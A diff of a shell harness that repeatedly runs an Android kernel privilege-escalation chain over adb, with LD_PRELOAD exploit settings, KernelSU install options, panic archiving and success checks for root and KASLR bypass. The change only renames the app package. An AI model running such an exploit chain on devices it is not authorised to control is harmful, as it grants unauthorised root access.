@@ -68,7 +68,7 @@ refocus() {
   f=$(timeout 10 "$ABE" -s "$LAN" shell 'dumpsys window | grep mCurrentFocus' 2>/dev/null | tr -d '\r')
   case "$f" in
     *postlock*) : ;;
-    *) timeout 10 "$ABE" -s "$LAN" shell 'am start -n com.postlock.boot/.MainActivity >/dev/null 2>&1' >/dev/null 2>&1 ;;
+    *) timeout 10 "$ABE" -s "$LAN" shell 'am start -n com.postlock/.MainActivity >/dev/null 2>&1' >/dev/null 2>&1 ;;
   esac
 }
 
@@ -77,8 +77,8 @@ panic_archive() {
   mkdir -p "$rd"
   echo "PANIC $why" > "$rd/result"   # 防复用旧目录时 PASS 遗留误导（2026-10-23）
   log "PANIC! $why -- 归档取证到 $rd"
-  sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$rd/chain.log" 2>/dev/null
-  sh_ab 'run-as com.postlock.boot cat files/postlock/receiver.log' > "$rd/receiver.log" 2>/dev/null
+  sh_ab 'run-as com.postlock cat files/postlock/chain.log' > "$rd/chain.log" 2>/dev/null
+  sh_ab 'run-as com.postlock cat files/postlock/receiver.log' > "$rd/receiver.log" 2>/dev/null
   sh_ab 'cat /data/local/tmp/payload_hold.log' > "$rd/payload_hold.log" 2>/dev/null
   sh_ab 'cat /data/local/tmp/postlock_restore.log' > "$rd/restore.log" 2>/dev/null
   sh_ab 'dmesg' > "$rd/dmesg.txt" 2>/dev/null
@@ -104,7 +104,7 @@ for ROUND in $(seq 1 "$MAX_ROUNDS"); do
   echo "$NB" > "$RD/boot_id"
   ROUND_BOOT_MS=$(date +%s%3N)  # rlog 时间戳与 host 同域(ms)，本轮 ENTER 判新基准
 
-  sh_ab 'am start -n com.postlock.boot/.MainActivity >/dev/null; echo ok' >/dev/null
+  sh_ab 'am start -n com.postlock/.MainActivity >/dev/null; echo ok' >/dev/null
 
   # ---- 泄题轮 ----
   timeout 25 "$ABE" -s "$LAN" shell "setsid nohup env LD_PRELOAD=$SO KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 KS_PAYLOAD_SCAN=1 KSNITCH_VERBOSE=1 KS_SLIDE_SKIP=1 KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1 KS_PIPE_SLABS=15 KS_PIPE_MAX_ATTEMPTS=2 KS_WAVE_FLAT_MAX=8 KS_PREPARE_HALT=1800 KS_PAYLOAD_BASE_FILE=/data/local/tmp/skbdelta KSUD_DST=/data/local/tmp/ksud KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0 /system/bin/sh -c \"echo PAYLOAD-HOLD-DONE\" > /data/local/tmp/payload_hold.log 2>&1 < /dev/null & echo HOLD=\$!" | tr -d '\r' >> "$RD/hold_start.txt"
@@ -137,14 +137,14 @@ for ROUND in $(seq 1 "$MAX_ROUNDS"); do
   log "round $ROUND: 泄题就绪 ($(date +%T))"
 
   # ---- 等 app dispatch ----
-  sh_ab 'run-as com.postlock.boot wc -l < files/postlock/receiver.log' > "$RD/rlog_start.lines" 2>/dev/null
+  sh_ab 'run-as com.postlock wc -l < files/postlock/receiver.log' > "$RD/rlog_start.lines" 2>/dev/null
   DISPATCHED=0
   for i in $(seq 1 $((T_DISPATCH / 15))); do
     sleep 15
     st=$(boot_state "$NB")
     [ "$st" = "1" ] && { panic_archive "$RD" "round $ROUND dispatch 等待期 boot_id 变化"; exit 97; }
     refocus
-    R=$(sh_ab 'run-as com.postlock.boot grep "triggerChain ENTER" files/postlock/receiver.log 2>/dev/null | tail -1')
+    R=$(sh_ab 'run-as com.postlock grep "triggerChain ENTER" files/postlock/receiver.log 2>/dev/null | tail -1')
     # 统一日志前缀 [b<boot8> HH:mm:ss.SSS]（2026-10-24）：行首不再是
     # epoch ms，直接比本 boot 的 boot_id 头；旧格式行无 [b 前缀自动不匹配。
     CB=$(sh_ab 'cut -c1-8 /proc/sys/kernel/random/boot_id 2>/dev/null' | tr -d '\r')
@@ -162,7 +162,7 @@ for ROUND in $(seq 1 "$MAX_ROUNDS"); do
 
   # ---- 等链结束（保活 + panic 检测）----
   # chain.log 累积不清空：记录 dispatch 时刻行数作起点
-  CST=$(sh_ab 'run-as com.postlock.boot wc -l < files/postlock/chain.log')
+  CST=$(sh_ab 'run-as com.postlock wc -l < files/postlock/chain.log')
   CST=${CST:-0}
   CHAIN_DONE=0
   for i in $(seq 1 $((T_CHAIN / 15))); do
@@ -173,7 +173,7 @@ for ROUND in $(seq 1 "$MAX_ROUNDS"); do
       exit 97
     fi
     refocus
-    R=$(sh_ab "run-as com.postlock.boot tail -n +$((CST + 1)) files/postlock/chain.log 2>/dev/null | grep -E 'CHAIN_EXIT_DONE' | tail -1")
+    R=$(sh_ab "run-as com.postlock tail -n +$((CST + 1)) files/postlock/chain.log 2>/dev/null | grep -E 'CHAIN_EXIT_DONE' | tail -1")
     [ -n "$R" ] && { CHAIN_DONE=1; break; }
   done
   if [ "$CHAIN_DONE" != "1" ]; then
@@ -181,12 +181,12 @@ for ROUND in $(seq 1 "$MAX_ROUNDS"); do
     st=$(boot_state "$NB")
     [ "$st" = "1" ] && { panic_archive "$RD" "round $ROUND 链超时后 boot_id 变化"; exit 97; }
     log "round $ROUND: FAIL 链超时无 CHAIN_EXIT_DONE -- 归档 reboot 进下一轮"
-    sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
+    sh_ab 'run-as com.postlock cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
     continue
   fi
 
   # ---- 判据 ----
-  sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
+  sh_ab 'run-as com.postlock cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
   NEWSEG=$(tail -n +"$((CST + 1))" "$RD/chain.log" 2>/dev/null)
   ROOT1=$(echo "$NEWSEG" | grep -c 'root=1 kaslr=1')
   OWNED=$(echo "$NEWSEG" | grep -oE 'waves=[0-9]+ taken=[0-9]+ owned=1' | tail -1)
